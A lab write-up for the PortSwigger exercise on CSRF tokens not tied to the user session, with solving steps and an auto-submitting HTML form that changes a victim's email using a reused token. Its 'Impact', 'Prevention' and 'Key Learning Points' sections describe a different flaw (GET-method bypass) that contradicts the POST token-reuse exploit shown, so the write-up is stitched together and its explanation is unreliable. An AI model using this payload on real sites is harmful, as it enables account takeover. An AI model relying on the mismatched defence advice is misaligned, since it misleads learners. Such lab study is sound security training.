# Lab: CSRF where token is not tied to user session

**Difficulty:** Practitioner  
**Category:** Cross-Site Request Forgery (CSRF)  
**Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

## 🎯 Objective
Exploit a CSRF vulnerability where the token is not bound to the victim's session.

## 📖 Description
The application uses a CSRF token, but it is **not tied to the user session**. A token generated for one user (or attacker) can be used to perform actions on behalf of another user.

## 🔍 Vulnerability Analysis

- **Vulnerable Endpoint**: `POST /my-account/change-email`
- **Weakness**: The CSRF token is validated, but it is not associated with the specific session ID of the user.
- **Impact**: Any valid token can be reused across sessions.

## 🛠️ How to Solve (Step by Step)

1. Log in to your own account (`wiener:peter`).
2. Perform a normal email change and capture the request in Burp Suite.
3. Copy the `csrf` token value from your request.
4. Create a CSRF exploit using **that same token** (it will work for the victim too).
5. Deliver the exploit to the victim.

## 💥 Exploit Code

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit - Token Reuse</title>
</head>
<body>
    <h1>Updating account...</h1>
    
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
        <input type="hidden" name="csrf" value="PASTE-YOUR-TOKEN-HERE">
    </form>

    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```
🚀 Delivery Steps

Go to Exploit Server.
Paste the HTML in the Body section.
Deliver to victim.
The lab solves when the email is changed.

⚡ Impact
An attacker can perform state-changing actions using simple GET requests, bypassing the intended CSRF protection.
🛡️ Prevention Methods

Validate CSRF token regardless of HTTP method.
Reject GET requests for state-changing operations (use POST/PUT/DELETE only).
Follow RESTful principles: GET should be safe and idempotent.

🔬 Key Learning Points

CSRF defenses must cover all HTTP methods that perform actions.
Relying only on request method for security is dangerous.
Always validate tokens on every state-changing request.
